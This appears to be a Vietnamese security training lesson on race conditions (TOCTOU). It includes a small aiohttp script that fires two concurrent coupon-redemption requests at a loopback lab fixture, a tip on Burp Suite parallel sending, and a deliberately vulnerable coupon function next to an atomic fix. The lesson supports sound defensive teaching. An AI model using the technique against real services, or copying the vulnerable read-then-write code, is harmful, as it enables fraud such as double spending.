---
schema_version: 1
id: WEB-A06-RACE-CONDITIONS
title: "Race Conditions (TOCTOU)"
slug: race-conditions
level: intermediate
estimated_minutes: 50
prerequisites:
  - http-fundamentals
  - authorized-security-testing
owasp:
  - A06:2025
cwe:
  - CWE-362
  - CWE-367
content_status: technical-review
payload_status: static-verified
last_verified: null
---

# Race Conditions (TOCTOU)

> [!CAUTION]
> Chỉ thực hành trên hệ thống bạn sở hữu hoặc có ủy quyền rõ ràng. Dùng dữ liệu giả, fixture có thể hủy và giới hạn tài nguyên; không gửi payload đến Internet hoặc mục tiêu thật.

## 1. Mục tiêu học tập

Sau bài học, bạn có thể:

- Giải thích Race Conditions (TOCTOU) bằng root cause thay vì chỉ mô tả hậu quả.
- Nhận diện trust boundary, tài sản, actor và điều kiện cần để lỗi có thể bị khai thác.
- Thực hiện kiểm thử có kiểm soát trong lab local và phân biệt expected result với false positive.
- Chọn kiểm soát gốc, triển khai bản sửa và retest bằng positive, negative và boundary case.

## 2. Kiến thức cần có

- Nắm luồng HTTP request/response của tình huống Race Conditions (TOCTOU) và cách ứng dụng xử lý input qua các trust boundary.
- Phân biệt authentication, authorization và validation.
- Biết đọc code/configuration trong ngôn ngữ hoặc framework xuất hiện ở ví dụ.
- Có lab local cô lập, dữ liệu giả, log quan sát được và quyền kiểm thử rõ ràng.

## 3. Kiến thức nền tảng

Hãy tưởng tượng bạn và một người bạn dùng chung một tài khoản ngân hàng chỉ có 1.000.000 đồng. Vào cùng một giây, cả hai người đứng ở hai cây ATM khác nhau và cùng nhấn lệnh rút 1.000.000 đồng. Cây ATM thứ nhất hỏi máy chủ: "Tài khoản này đủ tiền không?" - Máy chủ trả lời: "Có, đủ 1.000.000 đồng". Tuy nhiên, ngay trước khi máy chủ kịp trừ tiền ở cây ATM thứ nhất, cây ATM thứ hai cũng gửi câu hỏi tương tự và máy chủ vẫn trả lời: "Có, đủ 1.000.000 đồng" (vì số dư chưa bị trừ). Kết quả là cả hai cây ATM đều nhả tiền và bạn đã rút được 2.000.000 đồng từ tài khoản chỉ có 1.000.000 đồng. Hiện tượng tranh giành tài nguyên này được gọi là **Điều kiện tranh chấp (Race Condition)**.

Trong các hệ thống máy tính hiện đại, để phục vụ hàng ngàn người dùng cùng lúc, máy chủ phải xử lý nhiều yêu cầu song song (đa luồng - **multithreading**). Khi các yêu cầu này cùng đọc và ghi vào một cơ sở dữ liệu chung, nếu không được sắp xếp thứ tự cẩn thận, chúng sẽ đè lên nhau.

Trường hợp phổ biến nhất là lỗi **TOCTOU (Time-of-Check to Time-of-Use)**. Đây là quy trình hai bước: đầu tiên hệ thống kiểm tra điều kiện (Check), sau đó mới thực hiện hành động dựa trên kết quả đó (Use). Khoảng thời gian trống cực kỳ ngắn giữa hai bước này chính là **cửa sổ tranh chấp (race window)**. Kẻ tấn công sẽ tìm cách chen vào khoảng trống này để thực hiện hành động trước khi hệ thống kịp ghi nhận thay đổi.

Ví dụ quy trình chuyển tiền bình thường:

```python
# A single-threaded demonstration; this is not sufficient for concurrent production use.
def transfer(sender_id, receiver_id, amount):
    sender = get_account(sender_id)

    # CHECK: verify sufficient balance
    if sender.balance >= amount:
        # USE: deduct and credit
        sender.balance -= amount
        receiver = get_account(receiver_id)
        receiver.balance += amount
        save(sender)
        save(receiver)
        return "Transfer successful"

    return "Insufficient funds"
```

Trong minh họa không có concurrency, đoạn code có thể cho kết quả mong đợi. Trong hệ thống thực tế, tính đúng còn phụ thuộc transaction, lỗi từng phần và quy tắc ghi dữ liệu. Khi hai request đồng thời đọc cùng số dư trước lúc cập nhật, invariant có thể bị phá vỡ và tạo double spending.

## 4. Mô tả và nguyên nhân gốc

Lỗ hổng Điều kiện tranh chấp (Race Condition) xảy ra khi tính chính xác của chương trình phụ thuộc vào thời gian hoặc thứ tự thực thi của các tiến trình song song.

Kẻ tấn công khai thác lỗ hổng này bằng cách sử dụng các công cụ gửi hàng loạt yêu cầu giống hệt nhau lên máy chủ trong cùng một mili giây. Bằng cách làm ngập máy chủ như vậy, chúng cố tình tạo ra tình huống tranh chấp để vượt qua các bước kiểm tra logic của hệ thống.

Mối nguy hiểm của lỗ hổng này là kẻ tấn công có thể thực hiện những hành động bất hợp pháp như rút tiền quá hạn mức (double spending), áp dụng một mã giảm giá nhiều lần để mua hàng miễn phí, bỏ phiếu lặp lại hoặc đăng ký nhiều tài khoản có cùng tên đăng nhập. Lỗi này cực kỳ khó phát hiện nếu chỉ kiểm thử theo cách thông thường từng bước một.

> **Nguồn tham khảo:** các claim kỹ thuật trong bài được gắn marker nguồn; khi áp dụng thực tế, hãy đối chiếu phiên bản/framework đang dùng: [S1], [S2], [S3], [S4].

## 5. Mô hình đe dọa và điều kiện khai thác

- **Tài sản:** balance, coupon và invariant one-time.
- **Actor, xác thực và role:** role user gửi đúng hai request đồng thời trên account fixture.
- **Điều kiện khai thác:** check-then-write không atomic cho hai request thấy cùng state cũ.
- **Browser, proxy, framework và phiên bản:** Python 3.12 aiohttp và PostgreSQL 16 tại 127.0.0.1 với cap hai request; phải lưu image/package version thực tế cùng evidence.
- **Bằng chứng bắt buộc:** cùng correlation ID phải nối input, quyết định kiểm soát và tác động lên đúng tài sản; status code riêng lẻ không đủ. [S1]

## 6. Cơ chế tấn công

Đối với race conditions, check-then-write không atomic cho hai request thấy cùng state cũ. Positive case phải chứng minh input đến đúng sink và tạo tác động đã mô tả; negative case khi bật kiểm soát gốc phải bị chặn trước side effect. Kết luận chỉ áp dụng cho môi trường được pin ở mục 5. [S1]

## 7. Kiểm thử trong lab được ủy quyền

1. **Setup:** khởi chạy Python 3.12 aiohttp và PostgreSQL 16 tại 127.0.0.1 với cap hai request; chỉ nạp dữ liệu tổng hợp, bật log ứng dụng/proxy/datastore và gắn correlation ID.
2. **Baseline:** gửi một input hợp lệ của use case race conditions; lưu raw request/response, quyết định policy và trạng thái tài sản trước test.
3. **Input và thao tác:** dùng đúng một payload cốt lõi ở mục 8 trong context đã annotation; thay đổi một biến mỗi lần và tuân thủ request cap.
4. **Expected result:** chỉ coi vulnerable fixture là positive khi log chứng minh cơ chế “check-then-write không atomic cho hai request thấy cùng state cũ”; secure fixture phải chặn trước side effect và boundary input phải fail closed.
5. **Cleanup:** xóa dữ liệu, marker và log của race conditions; thu hồi session/cache liên quan, hoàn nguyên snapshot và xác nhận không còn callback/process test.
6. **Giới hạn an toàn:** chỉ chạy trên loopback/`.lab.test`; không dùng target, credential hoặc dữ liệu thật; OOB/DoS/state-changing phải có network/CPU/memory/request cap.

## 8. Payload và phạm vi áp dụng

Các block dưới đây là ví dụ lab tối thiểu theo đúng context đã ghi trong annotation. Trước khi dùng, đối chiếu framework/phiên bản, encoding, expected result và risk; chỉ chạy trong fixture local có ủy quyền. Payload mở rộng thuộc `security_cheatsheet.md`; lesson chỉ giữ ví dụ cốt lõi.

Attacker sử dụng công cụ gửi nhiều request đồng thời để khai thác race window:

<!-- payload-id: WEB-A06-RACE-CONDITIONS-001 -->
<!-- context: Python 3.12 and aiohttp fixture calling a disposable ledger at 127.0.0.1:9002 -->
<!-- prerequisites: synthetic accounts and single-use coupon; database snapshot; exactly two concurrent requests; no outbound network -->
<!-- encoding: application/json encoded by aiohttp from the Python dictionary -->
<!-- expected-result: vulnerable fixture may record two credits while the fixed fixture records exactly one credit and one conflict -->
<!-- risk: state-changing -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```python
# Attack: sending concurrent requests to exploit race window
import asyncio
import aiohttp

async def exploit_double_spend(session, url, headers, payload):
    async with session.post(url, json=payload, headers=headers) as resp:
        return await resp.json()

async def main():
    url = "http://127.0.0.1:9002/api/redeem-coupon"
    headers = {"Authorization": "Bearer SYNTHETIC_LAB_TOKEN"}
    payload = {"coupon": "LAB-ONCE", "account": "fixture-user"}

    async with aiohttp.ClientSession() as session:
        # Keep the race test bounded to exactly two identical requests
        tasks = [exploit_double_spend(session, url, headers, payload) for _ in range(2)]
        results = await asyncio.gather(*tasks)

        # Count successful transfers (should be 1, but may be more)
        success = sum(1 for r in results if r.get("status") == "success")
        print(f"Successful transfers: {success}")

asyncio.run(main())
```

Với Burp Suite, attacker có thể dùng tính năng **"Send group in parallel (last-byte sync)"** trong Repeater để đồng bộ hóa chính xác thời điểm gửi request, tối đa hóa khả năng trúng race window.

## 9. Code dễ bị lỗi và code an toàn

```python
# VULNERABLE: read-then-write without locking
def redeem_coupon(user_id, coupon_code):
    coupon = db.query("SELECT * FROM coupons WHERE code = %s", coupon_code)
    if coupon and not coupon.used:
        # Race window: another request can pass the check here
        db.execute("UPDATE coupons SET used = TRUE WHERE code = %s", coupon_code)
        db.execute("UPDATE users SET balance = balance + %s WHERE id = %s", coupon.value, user_id)
        return {"status": "success", "credited": coupon.value}
    return {"status": "error", "message": "Invalid or used coupon"}
```

```python
# SECURE: atomic operation with database-level protection
def redeem_coupon_safe(user_id, coupon_code):
    # Atomic update: only succeeds if coupon is not yet used
    result = db.execute(
        "UPDATE coupons SET used = TRUE, used_by = %s "
        "WHERE code = %s AND used = FALSE "
        "RETURNING value",
        user_id, coupon_code
    )

    if result.rowcount == 1:
        coupon_value = result.fetchone().value
        # Credit user within same transaction
        db.execute(
            "UPDATE users SET balance = balance + %s WHERE id = %s",
            coupon_value, user_id
        )
        db.commit()
        return {"status": "success", "credited": coupon_value}

    db.rollback()
    return {"status": "error", "message": "Invalid or already used coupon"}
```

## 10. Phát hiện

- Ghi log actor/session, route hoặc operation, object/resource liên quan đến Race Conditions (TOCTOU), kết quả policy và correlation ID; không ghi secret hoặc toàn bộ token.
- So sánh authorization/validation failure với baseline hợp lệ và cảnh báo theo chuỗi hành vi, không chỉ theo một chuỗi payload.
- Kết hợp telemetry ứng dụng, reverse proxy và datastore để xác nhận request đã tới sink và có/không có tác động.
- Scanner hoặc WAF alert chỉ là tín hiệu điều tra; không phải bằng chứng duy nhất rằng lỗ hổng tồn tại. [S1]

## 11. Phòng thủ

### Kiểm soát bắt buộc

- Enforce invariant bằng atomic conditional update, transaction hoặc unique constraint.
- Áp dụng cùng kiểm soát cho mọi route, operation và đường xử lý tương đương; thất bại phải dừng trước side effect.

### Defense-in-depth

Với Race Conditions (TOCTOU), các biện pháp dưới đây hỗ trợ giảm blast radius hoặc tăng khả năng phát hiện. Rate limit, UUID khó đoán, WAF, CSP hoặc validation chung không được dùng để thay thế kiểm soát gốc.

- **Tóm tắt**: Phòng chống Race Condition bằng cách sử dụng các thao tác cơ sở dữ liệu nguyên tử (atomic), cơ chế khóa (locking) ở cấp độ DB hoặc khóa phân tán (Redis).
- **Các bước chi tiết**:
  - **Database-level locking**: Sử dụng `SELECT ... FOR UPDATE` hoặc optimistic locking với version column để serialize các thao tác trên cùng một bản ghi.
  - **Atomic operations**: Dùng câu lệnh SQL nguyên tử thay vì đọc-rồi-ghi riêng biệt.
  - **Distributed locks**: Sử dụng Redis lock hoặc database advisory lock cho hệ thống phân tán.
  - **Idempotency keys**: Yêu cầu client gửi kèm unique key cho mỗi thao tác, server từ chối các key trùng lặp.

## 12. Retest

- **Positive case:** với Race Conditions (TOCTOU), luồng hợp lệ vẫn hoạt động đúng cho actor và dữ liệu được phép.
- **Negative case:** cùng input/tài nguyên nhưng actor hoặc context không được phép bị từ chối mà không rò rỉ chi tiết nhạy cảm.
- **Boundary case:** kiểm tra giá trị rỗng, cực biên, encoding khác, request lặp, trạng thái phiên hết hạn và đường dẫn/operation tương đương.
- **Telemetry:** xác nhận policy decision, application log, proxy log và datastore side effect khớp correlation ID.
- **Tái kiểm tra:** lưu kịch bản tối thiểu tái hiện lỗi cũ và chứng minh bản sửa không phụ thuộc WAF/rate limit.

## 13. Sai lầm thường gặp

- Chỉ kiểm tra status code hoặc chuỗi phản hồi của Race Conditions (TOCTOU) mà không xác nhận side effect và log.
- Dùng payload đúng cú pháp nhưng sai DBMS, browser, framework, protocol hoặc injection context.
- Coi UUID, rate limit, WAF, CSP hoặc input validation chung là bản sửa cho một kiểm soát gốc khác.
- Chỉ sửa một route trong khi cùng sink/policy được dùng ở route khác.
- Kết luận lỗ hổng tồn tại khi chưa lưu lại nguồn, phiên bản fixture và bằng chứng quan sát được.

## 14. Tóm tắt và checklist

- [ ] Root cause, hậu quả và kỹ thuật khai thác đã được tách riêng.
- [ ] Actor, role/authentication, trust boundary, công nghệ và phiên bản đã rõ.
- [ ] Payload có ID duy nhất, context, encoding, điều kiện, expected result, risk, validation và source.
- [ ] Code dễ lỗi/an toàn dùng cùng framework, phiên bản và use case.
- [ ] Kiểm soát bắt buộc không bị thay thế bằng defense-in-depth.
- [ ] Positive, negative, boundary case và telemetry đã qua retest.
- [ ] Claim kỹ thuật nhạy cảm có nguồn tham khảo ở mục 17 và mọi link chỉ nằm ở mục 16–17.
- [ ] Cleanup hoàn tất; không còn secret, target thật, callback Internet hoặc dữ liệu khách hàng.

## 15. Giải thích thuật ngữ

- **Multithreading (Đa luồng)**: Công nghệ cho phép một chương trình máy tính thực hiện đồng thời nhiều luồng công việc khác nhau để tối ưu hóa hiệu suất và tốc độ xử lý.
- **Concurrency (Xử lý đồng thời)**: Khả năng của hệ thống xử lý nhiều nhiệm vụ hoặc yêu cầu chồng chéo nhau về mặt thời gian, tạo cảm giác chúng đang chạy song song cùng lúc.
- **Shared Resource (Tài nguyên chia sẻ)**: Bất kỳ biến dữ liệu, tệp tin hoặc vùng bộ nhớ nào mà nhiều tiến trình hoặc luồng xử lý khác nhau đều có quyền truy cập và chỉnh sửa.
- **TOCTOU (Time-of-Check to Time-of-Use)**: Lớp lỗ hổng bảo mật liên quan đến thời gian, xuất hiện khi có sự chậm trễ giữa thời điểm kiểm tra tính hợp lệ của tài nguyên và thời điểm thực sự sử dụng tài nguyên đó.
- **Race Window (Cửa sổ tranh chấp)**: Khoảng thời gian nhỏ giữa lúc điều kiện được kiểm tra và lúc hành động được thực hiện, là cơ hội để kẻ tấn công chen vào sửa đổi dữ liệu.
- **Atomic Operations (Thao tác nguyên tử)**: Thao tác có hiệu ứng được quan sát như một đơn vị không thể chia nhỏ đối với phạm vi và mô hình nhất quán đã xác định; không có nghĩa là mọi mã bên trong đều không thể bị scheduler tạm dừng.

## 16. Bài liên quan và đọc thêm

- [Business Logic Vulnerabilities](../business-logic-vulnerabilities/) — Lỗ hổng logic nghiệp vụ, nơi Race Conditions thường được sử dụng để phá vỡ các giả định và quy trình nghiệp vụ như mua hàng hoặc thanh toán.

## 17. Tài liệu tham khảo

- **[S1]** PortSwigger. https://portswigger.net/web-security/race-conditions — phiên bản/trạng thái: bản hiện hành; truy cập: 2026-07-18.
- **[S2]** CWE-367 — Time-of-check Time-of-use Race Condition. https://cwe.mitre.org/data/definitions/367.html — phiên bản/trạng thái: CWE 4.20; truy cập: 2026-07-18.
- **[S3]** CWE. https://cwe.mitre.org/data/definitions/362.html — phiên bản/trạng thái: bản hiện hành; truy cập: 2026-07-18.
- **[S4]** OWASP Top 10:2025. https://owasp.org/Top10/2025/ — phiên bản/trạng thái: bản hiện hành; truy cập: 2026-07-18.
